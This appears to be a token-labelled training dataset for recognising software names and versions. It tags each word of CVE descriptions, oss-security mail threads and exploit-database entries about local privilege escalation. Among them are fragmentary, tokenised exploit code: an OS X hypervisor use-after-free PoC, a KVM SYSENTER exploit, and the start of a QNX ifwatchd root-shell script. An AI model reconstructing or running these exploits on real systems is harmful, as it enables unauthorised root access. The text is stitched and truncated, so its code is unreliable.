via O
x509 O
certificate O
DER O
files O
. O

Tags O
with O
indefinite O
length O
can O
be O
used O
to O
corrupt O
the O
_dp O
and O
_len O
pointers O
in O
asn1_find_indefinite_length O
( O
) O
in O
lib/asn1_decoder.c O
The O
vulnerable O
code O
: O
... O
next_tag O
: O
if O
( O
unlikely O
( O
datalen O
- O
dp O
< O
2 O
) O
) O
{ O
if O
( O
datalen O
dp O
) O
goto O
missing_eoc O
; O
goto O
data_overrun_error O
n O
= O
len O
- O
0x80 O
; O
if O
( O
unlikely O
( O
n O
sizeof O
( O
size_t O
) O
- O
1 O
) O
) O
goto O
length_too_long O
; O
if O
( O
unlikely O
( O
n O
datalen O
- O
dp O
) O
) O
goto O
data_overrun_error O
; O
for O
( O
len O
= O
0 O
; O
n O
0 O
; O
n O
) O
{ O
len O
= O
8 O
; O
len O
|= O
data O
[ O
dp O
dp O
+= O
len O
; O
goto O
next_tag O
; O
... O

The O
dp O
can O
be O
corrupted O
and O
the O
check O
at O
next_tag O
is O
not O
sufficient O
to O
prevent O
this O
. O

The O
Secondary O
Logon O
Service O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
and SV
1511 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Secondary O
Logon O
Elevation O
of O
Privilege O
Vulnerability O
. O

Heap-based O
buffer O
overflow O
in O
the O
HIFI O
driver O
in O
Huawei SN
P8 SN
smartphones O
with O
software O
GRA-TL00 SV
before SV
GRA-TL00C01B230 SV
, O
GRA-CL00 SV
before SV
GRA-CL00C92B230 SV
, O
GRA-CL10 SV
before SV
GRA-CL10C92B230 SV
, O
GRA-UL00 SV
before SV
GRA-UL00C00B230 SV
, O
and SV
GRA-UL10 SV
before SV
GRA-UL10C00B230 SV
, O
and O
Mate SN
S SN
smartphones SN
with O
software O
CRR-TL00 SV
before SV
CRR-TL00C01B160SP01 SV
, O
CRR-UL00 SV
before SV
CRR-UL00C00B160 SV
, O
and SV
CRR-CL00 SV
before SV
CRR-CL00C92B161 SV
allows O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
system O
crash O
) O
or O
gain O
privileges O
via O
a O
crafted O
application O
, O
a O
different O
vulnerability O
than O
CVE-2015-8318 O
. O

SafeNet O
Authentication O
Service O
for O
NPS O
Agent O
uses O
a O
weak O
ACL O
for O
unspecified O
installation O
directories O
and O
executable O
modules O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
by O
modifying O
an O
executable O
module O
. O

See O
CVE-2015-8328 O
for O
the O
vulnerability O
in O
the O
NVAPI O
support O
layer O
in O
NVIDIA O
drivers O
for O
Windows O
. O

Multiple O
integer O
overflows O
in O
the O
kernel O
mode O
driver O
for O
the O
NVIDIA SN
GPU SN
graphics SN
driver SN
R340 SV
before SV
341.92 SV
, O
R352 SV
before SV
354.35 SV
, O
and SV
R358 SV
before SV
358.87 SV
on O
Windows O
and O
R304 SV
before SV
304.131 SV
, O
R340 SV
before SV
340.96 SV
, O
R352 SV
before SV
352.63 SV
, O
and SV
R358 SV
before SV
358.16 SV
on O
Linux O
allow O
local O
users O
to O
obtain O
sensitive O
information O
, O
cause O
a O
denial O
of O
service O
( O
crash O
) O
, O
or O
possibly O
gain O
privileges O
via O
unknown O
vectors O
, O
which O
trigger O
uninitialized O
or O
out O
of O
bounds O
memory O
access O
. O

NOTE O
: O
this O
identifier O
has O
been O
SPLIT O
per O
ADT2 O
and O
ADT3 O
due O
to O
different O
vulnerability O
type O
and O
affected O
versions O
. O

SafeNet O
Authentication O
Service O
End O
User O
Software O
Tools O
for O
Windows O
uses O
a O
weak O
ACL O
for O
unspecified O
installation O
directories O
and O
executable O
modules O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
by O
modifying O
an O
executable O
module O
. O

consoleinst.sh O
in O
IBM SN
Installation SN
Manager SN
before SV
1.7.4.4 SV
and SV
1.8.x SV
before SV
1.8.4 SV
and O
Packaging SN
Utility SN
before SV
1.7.4.4 SV
and SV
1.8.x SV
before SV
1.8.4 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
program O
that O
is O
located O
in O
/tmp O
with O
a O
name O
based O
on O
a O
predicted O
PID O
value O
. O

Use-after-free O
vulnerability O
in O
Hypervisor O
in O
Apple SN
OS SN
X SN
before SV
10.11.2 SV
allows O
local O
users O
to O
gain O
privileges O
via O
vectors O
involving O
VM O
objects O
. O

tested O
on O
OS SN
X SN
10.11 SV
ElCapitan SV
( O
15a284 SV
) O
on O
MacBookAir O
5,2 O
ianbeer O
boot-args O
: O
debug=0x144 O
-v O
pmuflags=1 O
kdp_match_name=en3 O
gzalloc_min=100 O
gzalloc_max=300 O
-zp O
-zc O
OS O
X O
Kernel O
UaF O
in O
hypervisor O
driver O
The O
hv_space O
lock O
group O
gets O
an O
extra O
ref O
dropped O
( O
uaf O
) O
when O
you O
kill O
a O
process O
with O
an O
AppleHV O
userclient O
; O
one O
via O
IOService O
: O
:terminateWorker O
calling O
the O
AppleHVClient O
: O
:free O
method O
( O
which O
calls O
lck_rw_free O
on O
the O
lock O
group O
using O
the O
pointer O
hanging O
off O
the O
global O
_hv O
variable O
) O
and O
secondly O
via O
the O
hypervisor O
machine_thread_destroy O
callback O
( O
hv_callback_thread_destroy O
) O
which O
also O
calls O
lck_rw_free O
with O
a O
lock O
group O
pointer O
taken O
from O
_hv O
. O

Source O
: O
hv_space O
lock O
group O
gets O
an O
extra O
ref O
dropped O
when O
you O
kill O
a O
process O
with O
an O
AppleHV O
userclient O
; O
one O
via O
IOService O
: O
:terminateWorker O
calling O
the O
AppleHVClient O
: O
:free O
method O
( O
which O
calls O
lck_rw_free O
on O
the O
lock O
group O
using O
the O
pointer O
hanging O
off O
the O
global O
_hv O
variable O
) O
and O
secondly O
via O
the O
hypervisor O
machine_thread_destroy O
callback O
( O
hv_callback_thread_destroy O
) O
which O
also O
calls O
lck_rw_free O
with O
a O
lock O
group O
pointer O
taken O
from O
_hv O
. O

tested O
on O
OS SN
X SN
10.11 SV
ElCapitan SV
( O
15a284 SV
) O
on O
MacBookAir O
5,2 O
include O
< O
stdio.h O
include O
< O
stdlib.h O
include O
< O
signal.h O
include O
< O
unistd.h O
include O
< O
IOKit/IOKitLib.h O
int O
go O
( O
) O
{ O
io_service_t O
service O
= O
IOServiceGetMatchingService O
( O
kIOMasterPortDefault O
, O
IOServiceMatching O
( O
AppleHV O
) O
) O
; O
if O
( O
service O
MACH_PORT_NULL O
) O
{ O
printf O
( O
can O
t O
find O
service O
) O
; O
return O
0 O
; O
} O
while O
( O
1 O
) O
{ O
io_connect_t O
conn O
; O
IOServiceOpen O
( O
service O
, O
mach_task_self O
( O
) O
, O
0 O
, O
& O
conn O
) O
; O
if O
( O
conn O
MACH_PORT_NULL O
) O
{ O
printf O
( O
can O
t O
connect O
to O
service O
) O
; O
return O
0 O
; O
} O
uint64_t O
inputScalar O
[ O
16 O
] O
; O
size_t O
inputScalarCnt O
= O
0 O
; O
uint8_t O
inputStruct O
[ O
4096 O
] O
; O
size_t O
inputStructCnt O
= O
0 O
; O
uint64_t O
outputScalar O
[ O
16 O
] O
= O
{ O
0 O
} O
; O
uint32_t O
outputScalarCnt O
= O
16 O
; O
char O
outputStruct O
[ O
4096 O
] O
= O
{ O
0 O
} O
; O
size_t O
outputStructCnt O
= O
4096 O
; O
kern_return_t O
err O
= O
IOConnectCallMethod O
( O
conn O
, O
1 O
, O
inputScalar O
, O
inputScalarCnt O
, O
inputStruct O
, O
inputStructCnt O
, O
outputScalar O
, O
& O
outputScalarCnt O
, O
outputStruct O
, O
& O
outputStructCnt O
) O
; O
IOServiceClose O
( O
conn O
int O
main O
( O
int O
argc O
, O
char O
argv O
) O
{ O
pid_t O

Apple O
Mac O
OSX O
Kernel O
- O
Hypervisor O
Driver O
Use-After-Free O

Microsoft SN
Windows SN
8 SV
, O
Windows SN
8.1 SV
, O
Windows SN
Server SV
2012 SV
Gold SV
and SV
R2 SV
, O
Windows SN
RT SV
Gold SV
and SV
8.1 SV
, O
and O
Windows SN
10 SV
Gold SV
and SV
1511 SV
mishandle O
library O
loading O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Windows O
Library O
Loading O
Remote O
Code O
Execution O
Vulnerability O
. O

The O
kernel O
in O
Apple SN
iOS SN
before SV
9 SV
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
unspecified O
vectors O
, O
a O
different O
vulnerability O
than O
CVE-2015-5868 O
and O
CVE-2015-5903 O
. O

Integer O
overflow O
in O
the O
authentication_agent_new_cookie O
function O
in O
PolicyKit SN
( O
aka SN
polkit SN
) O
before SV
0.113 SV
allows O
local O
users O
to O
gain O
privileges O
by O
creating O
a O
large O
number O
of O
connections O
, O
which O
triggers O
the O
issuance O
of O
a O
duplicate O
cookie O
value O
. O

Subject O
: O
CVE O
request O
for O
polkit O
See O
: O
And O
because O
mailman O
breaks O
threading O
across O
months O
: O

Date O
: O
Mon O
, O
08 O
Jun O
2015 O
08:24:50 O
-0400 O
From O
: O
Colin O
Walters O
< O
walters O
@ O
... O
bum.org O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O

Subject O
: O
CVE O
request O
for O
polkit O

Is O
there O
any O
polkit O
documentation O
that O
suggests O
that O
two O
clients O
are O
allowed O
to O
interfere O
with O
each O
other O
as O
long O
as O
they O
have O
the O
same O
uid O

That O
sounds O
right O
to O
me O
. O

I O
see O
uid O
matching O
as O
a O
fix O
for O
the O
wraparound O
. O

Or O
to O
turn O
it O
around O
, O
polkit O
in O
many O
places O
matches O
uids O
, O
this O
adds O
another O
one O
to O
fix O
a O
bug O
with O
cookie O
handling O
. O

( O
This O
is O
in O
the O
general O
case O
where O
at O
least O
one O
of O
the O
two O
clients O
is O
executing O
with O
substantial O
restrictions O
. O
) O

The O
original O
2015-05-29 O
message O
seems O
to O
be O
about O
clients O
whereas O
the O
first O
2015-06-03 O
message O
seems O
to O
be O
about O
users O
or O
uids O
. O

Would O
that O
be O
OK O

Currently O
, O
polkit O
is O
not O
ready O
to O
perform O
compartmentalization O
of O
that O
form O
- O
it O
treats O
equal O
uids O
as O
equal O
security O
domains O
. O

The O
default O
authority O
already O
restricts O
agents O
to O
only O
be O
able O
to O
register O
for O
subjects O
of O
matching O
uid O
. O

Date O
: O
Mon O
, O
08 O
Jun O
2015 O
16:06:18 O
-0400 O
From O
: O
Colin O
Walters O
< O
walters O
@ O
... O
bum.org O
To O
: O
cve-assign O
@ O
... O
re.org O
Cc O
: O
oss-security O
@ O
... O
ts.openwall.com O
, O
Miloslav O
Trma O
xc3 O
x84 O
xc2 O
x8d O
< O
mitr O
@ O
... O
hat.com O

Subject O
: O
Re O
: O
CVE O
request O
for O
polkit O

By O
substantial O
restrictions O
you O
re O
thinking O
of O
things O
like O
SELinux O
policy O
domains O

( O
Most O
importantly O
, O
uid O
0 O
is O
treated O
as O
privileged O
, O
even O
if O
it O
in O
a O
confined O
domain O
) O
For O
purposes O
of O
CVE O
, O
we O
may O
be O
able O
to O
model O
this O
as O
a O
situation O
in O
which O
the O
( O
realistically O
exploitable O
) O
counter O
wraparound O
is O
a O
clear O
implementation O
error O
and O
can O
have O
a O
CVE O
ID O
, O
but O
the O
concept O
of O
uid O
matching O
is O
a O
design O
change O
that O
is O
essentially O
outside O
the O
scope O
of O
CVE O
. O

The O
counter O
gets O
incremented O
but O
the O
cookies O
never O
get O
removed O
from O
the O
list O
, O
until O
eventually O
counter O
wraps O
and O
a O
second O
cookie O
is O
minted O
. O

Subject O
: O
Re O
: O
CVE O
request O
for O
polkit O
BEGIN O
PGP O
SIGNED O
MESSAGE O
Hash O
: O
SHA1 O
This O
can O
have O
a O
single O
CVE O
ID O
, O
CVE-2015-4625 O
. O

In O
other O
words O
, O
because O
the O
two O
concerns O
( O
90832 O
and O
90837 O
) O
are O
not O
independent O
vulnerabilities O
, O
there O
should O
not O
be O
two O
CVE O
IDs O
. O

With O
only O
this O
change O
, O
the O
original O
report O
of O
another O
process O
can O
generate O
2^32 O
authentication O
sessions O
and O
just O
disconnect O
immediately O
. O

this O
approach O
passes O
through O
the O
uid O
of O
the O
caller O
from O
the O
setuid O
binary O
, O
ensuring O
that O
we O
only O
look O
up O
`AuthenticationAgent`s O
that O
were O
created O
by O
a O
matching O
uid O
. O

- O
CVE O
assignment O
team O
, O
MITRE O
CVE O
Numbering O
Authority O
M/S O
M300 O
202 O
Burlington O
Road O
, O
Bedford O
, O
MA O
01730 O
USA O
[ O
PGP O
key O
available O
through O
] O
BEGIN O
PGP O
SIGNATURE O
Version O
: O
GnuPG O
v1.4.14 O
( O
SunOS O
) O
iQEcBAEBAgAGBQJVgI9cAAoJEKllVAevmvmsFuMIAIyxB79JHByD5607hzwv6+gL O
IT0YBcbDT1ow3uKIz+S5S91HpxJKCbg5InNzhCac0EpKU2l4HxILIdk0l/wcmnf9 O
rzr4kSzvRATaQYkj9X5oPIrLYXGSrGdxy6KYe8LMa0/Sis6RLVJve7C3YlCx1yZU O
FJMU43g3/sap7ReK40V8FnEDB4e3BH6+fUg5tqF+Q/rvvEEbwap3s2tv6GsP8RM O
cskGx2sgrLRO2fo/3NyIb8kOuJq8xmgVrCnNzzIoqvs9yzQTmMmGDLPfzN276nxB O
/NCsNJITO1Unb+TwZknxRJjBv4Ic1CfCC2IFD7vG/MgdO+3Zll+rZlml+5b0Zlg= O
=Mb9 O
END O
PGP O
SIGNATURE O

Date O
: O
Tue O
, O
16 O
Jun O
2015 O
17:06:24 O
-0400 O
( O
EDT O
) O
From O
: O
cve-assign O
@ O
... O
re.org O
To O
: O
walters O
@ O
... O
bum.org O
Cc O
: O
cve-assign O
@ O
... O
re.org O
, O
oss-security O
@ O
... O
ts.openwall.com O
, O
mitr O
@ O
... O
hat.com O

would O
still O
be O
considered O
an O
implementation O
error O
, O
but O
it O
could O
no O
longer O
be O
considered O
exploitable O
in O
the O
context O
of O
the O
current O
polkit O
security O
model O
. O

The O
DiskImages O
in O
Apple SN
iOS SN
before SV
8.4.1 SV
and O
OS SN
X SN
before SV
10.10.5 SV
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
via O
a O
malformed O
DMG O
image O
. O

Buffer O
overflow O
in O
the O
Intel O
Graphics O
Driver O
in O
Apple SN
OS SN
X SN
before SV
10.10.4 SV
allows O
local O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
, O
a O
different O
vulnerability O
than O
CVE-2015-3696 O
, O
CVE-2015-3697 O
, O
CVE-2015-3698 O
, O
CVE-2015-3699 O
, O
CVE-2015-3700 O
, O
CVE-2015-3701 O
, O
and O
CVE-2015-3702 O
. O

The O
Windows O
client O
in O
SAP SN
Afaria SN
7.0.6398.0 SV
uses O
weak O
permissions O
( O
Everyone O
: O
read O
and O
Everyone O
: O
write O
) O
for O
the O
install O
folder O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
a O
Trojan O
horse O
XeService.exe O
file O
. O

The O
kernel-mode O
driver O
in O
Microsoft SN
Windows SN
Vista SV
SP2 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
7 SV
SP1 SV
, O
Windows SN
8 SV
, O
Windows SN
8.1 SV
, O
Windows SN
Server SV
2012 SV
Gold SV
and SV
R2 SV
, O
Windows SN
RT SV
Gold SV
and SV
8.1 SV
, O
and O
Windows SN
10 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Win32k O
Memory O
Corruption O
Elevation O
of O
Privilege O
Vulnerability O
, O
a O
different O
vulnerability O
than O
CVE-2015-2511 O
, O
CVE-2015-2517 O
, O
and O
CVE-2015-2546 O
. O

Source O
: O
attached O
testcase O
crashes O
Win SN
7 SV
with O
Special O
Pool O
on O
win32k O
while O
accessing O
freed O
memory O
in O
bGetRealizedBrush O
xe2 O
x80 O
x8b O
xe2 O
x80 O
x8b O
. O

Proof O
of O
Concept O
: O

Microsoft O
Windows O
Kernel O
- O
bGetRealizedBrush O
Use-After-Free O
( O
MS15-097 O
) O

win32k.sys O
in O
the O
kernel-mode O
drivers O
in O
Microsoft SN
Windows SN
Server SV
2003 SV
SP2 SV
and SV
R2 SV
SP2 SV
allows O
local O
users O
to O
gain O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
application O
, O
aka O
Win32k O
Memory O
Corruption O
Elevation O
of O
Privilege O
Vulnerability O
. O

Motorola O
Scanner O
SDK O
uses O
weak O
permissions O
for O
( O
1 O
) O
CoreScanner.exe O
, O
( O
2 O
) O
rsmdriverproviderservice.exe O
, O
and O
( O
3 O
) O
ScannerService.exe O
, O
which O
allows O
local O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
. O

kernel_crashdump O
in O
Apport SN
before SV
2.19 SV
allows O
local O
users O
to O
cause O
a O
denial O
of O
service O
( O
disk O
consumption O
) O
or O
possibly O
gain O
privileges O
via O
a O
( O
1 O
) O
symlink O
or O
( O
2 O
) O
hard O
link O
attack O
on O
/var/crash/vmcore.log O
. O

Also O
opening O
of O
input O
file O
does O
not O
care O
about O
links O
. O

For O
kernel O
crashes O
, O
upstart O
or O
SysV O
init O
invokes O
the O
program O
/usr/share/apport/kernel_crashdump O
at O
boot O
to O
prepare O
crash O
dump O
files O
for O
sending O
. O

As O
the O
crash O
dump O
directory O
/var/crash O
is O
world O
writable O
and O
kernel_crashdump O
performs O
file O
access O
in O
unsafe O
manner O
, O
any O
local O
user O
may O
trigger O
a O
denial O
of O
service O
or O
escalate O
to O
root O
privileges O
. O

If O
symlink O
and O
hardlink O
protection O
is O
enabled O
( O
which O
should O
be O
the O
default O
for O
any O
modern O
system O
) O
, O
only O
denial O
of O
service O
is O
possible O
. O

This O
action O
is O
performed O
with O
root O
privileges O
. O

Problematic O
syscall O
in O
kernel_crashdump O
is O
: O
open O
( O
/var/crash/linux-image-3.19.0-18-generic.0.crash O
, O
O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE|O_CLOEXEC O
, O
0666 O
) O
= O
30 O
... O
open O
( O
/var/crash/vmcore.log O
, O
O_RDONLY|O_LARGEFILE|O_CLOEXEC O
) O
= O
31 O
Thus O
the O
output O
file O
is O
opened O
unconditionally O
and O
without O
O_EXCL O
or O
O_NOFOLLOW O
. O

Apport SN
2.19 SV
( O
Ubuntu SN
15.04 SV
) O
- O
Local O
Privilege O
Escalation O

Untrusted O
search O
path O
vulnerability O
in O
Ecava SN
IntegraXor SN
SCADA SN
Server SN
before SV
4.2.4488 SV
allows O
local O
users O
to O
gain O
privileges O
via O
a O
renamed O
DLL O
in O
the O
default O
install O
directory O
. O

The O
IPC O
channel O
in O
Cisco SN
AnyConnect SN
Secure SN
Mobility SN
Client SN
4.0 SV
( O
.00051 SV
) O
and SV
earlier SV
allows O
local O
users O
to O
write O
to O
arbitrary O
userspace O
memory O
locations O
, O
and O
consequently O
gain O
privileges O
, O
via O
crafted O
messages O
, O
aka O
Bug O
ID O
CSCus79195 O
. O

The O
em_sysenter O
function O
in O
arch/x86/kvm/emulate.c O
in O
the O
Linux SN
kernel SN
before SV
3.18.5 SV
, O
when O
the O
guest O
OS O
lacks O
SYSENTER O
MSR O
initialization O
, O
allows O
guest O
OS O
users O
to O
gain O
guest O
OS O
privileges O
or O
cause O
a O
denial O
of O
service O
( O
guest O
OS O
crash O
) O
by O
triggering O
use O
of O
a O
16-bit O
code O
segment O
for O
emulation O
of O
a O
SYSENTER O
instruction O
. O

Regardless O
to O
SMP O
, O
it O
appears O
that O
an O
attack O
can O
also O
be O
launched O
on O
UP O
, O
if O
the O
guest O
is O
configured O
to O
run O
on O
Intel O
VCPU O
while O
the O
real O
CPU O
is O
AMD O
. O

Instead O
, O
it O
sets O
the O
guest O
instruction O
pointer O
to O
zero O
and O
changes O
the O
code O
privilege O
level O
( O
CPL O
) O
to O
zero O
( O
privileged O
) O
. O

In O
these O
systems O
, O
guest O
DoS O
is O
possible O
. O

The O
bug O
existed O
since O
the O
introduction O
of O
SYSENTER O
emulation O
( O
em_sysenter O
function O
on O
recent O
Linux O
releases O
) O
, O
in O
commit O
8c60435261deaefeb53ce3222d04d7d5bea81296 O
, O
which O
is O
present O
in O
Linux SN
2.6.32 SV
- SV
3.18 SV
. O

However O
, O
it O
can O
not O
be O
used O
for O
privilege O
escalation O
if O
the O
guest O
can O
not O
access O
the O
first O
memory O
page O
, O
whose O
virtual O
address O
is O
zero O
. O

Date O
: O
Tue O
, O
27 O
Jan O
2015 O
14:17:22 O
+0200 O
From O
: O
Nadav O
Amit O
< O
nadav.amit O
@ O
... O
il.com O
To O
: O
oss-security O
@ O
... O
ts.openwall.com O
Cc O
: O
Red O
Hat O
Product O
Security O
< O
secalert O
@ O
... O
hat.com O
> O
, O
Paolo O
Bonzini O
< O
pbonzini O
@ O
... O
hat.com O

AMD O
CPUs O
do O
not O
support O
SYSENTER O
in O
compatibility O
mode O
; O
KVM O
would O
emulate O
them O
so O
the O
VCPU O
would O
behave O
as O
if O
the O
physical O
CPU O
is O
Intel O
. O

KVM O
does O
not O
check O
under O
these O
conditions O
that O
the O
selector O
IA32_SYSENTER_CS O
is O
not O
zero O
, O
and O
does O
not O
generate O
a O
GP O
exception O
as O
real O
hardware O
does O
. O

The O
PoC O
therefore O
takes O
an O
argument O
that O
tells O
it O
how O
many O
cycles O
to O
wait O
before O
creating O
the O
race O
that O
fools O
the O
hypervisor O
into O
emulating O
a O
SYSENTER O
instruction O
. O

include O
< O
pthread.h O
include O
< O
err.h O
include O
< O
stdio.h O
include O
< O
stdlib.h O
include O
< O
stdint.h O
include O
< O
signal.h O
include O
< O
setjmp.h O
include O
< O
string.h O
include O
< O
stdbool.h O
include O
< O
sys/io.h O
include O
< O
asm/ldt.h O
include O
< O
sys/types.h O
include O
< O
sys/mman.h O
define O
MMAP_EXPLOIT O
asm O
( O
.pushsection O
.wtext O
, O
awx O
cs16ip1 O
: O
.int O
0 O
.byte O
0xf O
, O
0 O
entry1 O
: O
ljmp O
( O
cs16ip1 O
) O
badcode O
: O
.code16 O
ud2 O
jmp O
badcode O
.code64 O
.popsection O
) O
; O
volatile O
int O
sync O
= O
0 O
; O
extern O
volatile O
unsigned O
short O
badcode O
[ O
] O
; O
extern O
volatile O
void O
entry1 O
; O
int O
wait_cycles O
; O
static O
void O
proc O
( O
void O
ignored O
) O
{ O
sync O
= O
1 O
; O
while O
( O
true O
) O
{ O
volatile O
int O
cycles O
; O
badcode O
= O
0x340f O
; O
sysenter O
asm O
volatile O
( O
clflush O
( O
% O
0 O
r O
( O
badcode O
) O
) O
; O
for O
( O
cycles O
= O
0 O
; O
cycles O
< O
wait_cycles O
; O
cycles O
return O
NULL O
; O
} O
int O
main O
( O
int O
argc O
, O
char O
argv O
[ O
] O
) O
{ O
int O
res O
; O
void O
mem O
; O
pthread_t O
pth O
; O
struct O
user_desc O
d O
= O
{ O
.entry_number O
= O
1 O
, O
.base_addr O
= O
( O
unsigned O
long O
) O
& O
badcode O
, O
.limit O
= O
0xfffffu O
, O
.seg_32bit O
= O
0 O
, O
.contents O
= O
2 O
, O

Windows O
and O
distro O
Linux O
guest O
OSes O
should O
be O
safe O
. O

Using O
the O
PoC O
I O
manages O
to O
crash O
the O
guest O
Linux O
kernel O
, O
causing O
a O
double O
fault O
; O
and O
to O
demonstrate O
privilege O
escalation O
by O
successfully O
executing O
xc3 O
xa2 O
xc2 O
x80 O
xc2 O
x9cint O
$ O
2 O
xc3 O
xa2 O
xc2 O
x80 O
xc2 O
x9d O
that O
caused O
spurious O
NMI O
. O

As O
a O
result O
of O
these O
limitations O
the O
attack O
is O
only O
possible O
in O
when O
the O
guest O
uses O
certain O
OSes O
, O
for O
instance O
, O
Linux O
which O
was O
built O
without O
CONFIG_IA32_EMULATION O
( O
support O
for O
legacy O
32-bit O
programs O
) O
or O
FreeBSD O
. O

This O
is O
likely O
to O
trigger O
the O
vulnerability O
. O

Details O
: O
The O
success O
of O
such O
an O
attack O
and O
its O
results O
depend O
on O
the O
guest O
OS O
. O

The O
attack O
can O
be O
launched O
by O
tricking O
the O
hypervisor O
to O
emulate O
a O
SYSENTER O
instruction O
in O
16-bit O
mode O
, O
if O
the O
guest O
OS O
does O
not O
initialize O
the O
SYSENTER O
MSRs O
. O

An O
attack O
can O
be O
launched O
on O
an O
SMP O
guest O
, O
using O
guest O
code O
that O
tricks O
KVM O
into O
emulating O
the O
SYSENTER O
instruction O
. O

Note O
that O
the O
attack O
can O
only O
be O
issued O
under O
very O
certain O
conditions O
( O
see O
the O
details O
below O
) O
. O

The O
PoC O
is O
not O
fully O
automatic O
since O
dealing O
with O
signals O
in O
16-bit O
code O
is O
annoying O
. O

Privilege O
escalation O
attack O
requires O
that O
in O
addition O
guest O
processes O
would O
be O
able O
to O
access O
address O
zero O
. O

It O
is O
inapplicable O
if O
the O
guest O
OS O
initializes O
the O
SYSENTER O
MSRs O
, O
as O
Linux O
usually O
does O
. O

On O
my O
system O
, O
using O
100 O
as O
an O
input O
results O
produces O
the O
exploit O
. O

xc3 O
xa2 O
xc2 O
x80 O
xc2 O
x94 O
KVM O
SYSENTER O
EXPLOIT O
Some O
of O
the O
code O
of O
the O
PoC O
was O
borrowed O
from O
code O
that O
was O
written O
by O
Andy O
Lutomirski O
for O
another O
vulnerability O
. O

The O
attached O
PoC O
does O
just O
that O
. O

Red-hat O
assigned O
CVE-2015-0239 O
for O
this O
vulnerability O
. O

It O
first O
writes O
a O
UD2 O
instruction O
, O
causing O
a O
UD O
exception O
and O
a O
subsequent O
VM-exit O
, O
and O
then O
tries O
from O
another O
thread O
to O
rewrite O
the O
UD2 O
instruction O
with O
SYSENTER O
just O
before O
KVM O
emulates O
the O
instruction O
. O

Subject O
: O
KVM O
SYSENTER O
emulation O
vulnerability O
- O
CVE-2015-0239 O
Linux SN
2.6.32 SV
- SV
3.18 SV
that O
runs O
KVM O
may O
enable O
a O
malicious O
guest O
process O
to O
crash O
the O
guest O
OS O
or O
launch O
a O
privilege O
escalation O
attack O
on O
the O
guest O
. O

To O
fix O
the O
bug O
, O
you O
can O
apply O
the O
following O
patch O
- O
There O
are O
no O
known O
exploits O
of O
the O
vulnerability O
. O

For O
Linux O
guest O
, O
this O
requirement O
means O
the O
the O
kernel O
parameter O
vm.mmap_min_addr O
is O
set O
to O
zero O
. O

If O
the O
MSRs O
were O
not O
initialized O
, O
it O
can O
be O
used O
to O
crash O
the O
guest O
OS O
or O
for O
privilege O
escalation O
. O

Subject O
: O
KVM O
SYSENTER O
emulation O
vulnerability O
- O
CVE-2015-0239 O

IBM SN
WebSphere SN
Application SN
Server SN
( O
WAS SN
) O
8.5 SV
Liberty SN
Profile SN
before SV
8.5.5.5 SV
does O
not O
properly O
implement O
authData O
elements O
, O
which O
allows O
remote O
authenticated O
users O
to O
gain O
privileges O
via O
unspecified O
vectors O
. O

Multiple O
integer O
overflows O
in O
lib/libfdt/fdt_rw.c O
in O
the O
Qualcomm O
components O
in O
Android SN
before SV
2016-07-05 SV
on O
Nexus O
5 O
devices O
allow O
attackers O
to O
gain O
privileges O
via O
a O
crafted O
application O
, O
aka O
Android O
internal O
bug O
28822060 O
and O
Qualcomm O
internal O
bug O
CR705078 O
. O

Unspecified O
vulnerability O
in O
the O
Authentication O
in O
TIBCO SN
Spotfire SN
Server SN
before SV
4.5.2 SV
, O
5.0.x SV
before SV
5.0.3 SV
, O
5.5.x SV
before SV
5.5.2 SV
, O
6.0.x SV
before SV
6.0.3 SV
, O
and SV
6.5.x SV
before SV
6.5.1 SV
allows O
remote O
attackers O
to O
gain O
privileges O
, O
and O
obtain O
sensitive O
information O
or O
modify O
data O
, O
via O
unknown O
vectors O
. O

The O
CTIManager O
in O
Cisco SN
Unified SN
Communications SN
Manager SN
( O
CM SN
) O
10.0 SV
( O
1 SV
) O
, O
when O
single O
sign-on O
is O
enabled O
, O
does O
not O
properly O
validate O
Kerberos O
SSO O
tokens O
, O
which O
allows O
remote O
authenticated O
users O
to O
gain O
privileges O
and O
execute O
arbitrary O
commands O
via O
crafted O
token O
data O
, O
aka O
Bug O
ID O
CSCum95491 O
. O

Unspecified O
vulnerability O
in O
HP SN
NonStop SN
NetBatch SN
G06.14 SV
through SV
G06.32.01 SV
, O
H06 SV
through SV
H06.28 SV
, O
and SV
J06 SV
through SV
J06.17.01 SV
allows O
remote O
authenticated O
users O
to O
gain O
privileges O
for O
NetBatch O
job O
execution O
via O
unknown O
vectors O
. O

/sbin/ifwatchd O
in O
BlackBerry SN
QNX SN
Neutrino SN
RTOS SN
6.4.x SV
and SV
6.5.x SV
allows O
local O
users O
to O
gain O
privileges O
by O
providing O
an O
arbitrary O
program O
name O
as O
a O
command-line O
argument O
. O

Any O
user O
can O
launch O
ifwatchd O
and O
provide O
arbitrary O
up/down O
scripts O
. O

Once O
the O
setuid O
shell O
is O
in O
place O
ifwatchd O
will O
be O
killed O
to O
drop O
the O
user O
into O
the O
root O
shell O
. O

-x O
/sbin/ifwatchd O
] O
; O
then O
echo O
error O
: O
can O
not O
execute O
/sbin/ifwatchd O
exit O
1 O
fi O
echo O
QNX O
6.4.x/6.5.x O
ifwatchd O
local O
root O
exploit O
by O
cenobyte O
2013 O
echo O
echo O
[ O
- O
] O
creating O
fake O
arrival-script O
cat O
_EOF_ O
/tmp/0 O
! O
/bin/sh O
PATH=/bin O
: O
/usr/bin O
IFWPID= O
$ O
( O
ps O
-edaf O
| O
grep O
ifwatchd O
-A O
| O
awk O
! O
/grep O
{ O
print O
$ O
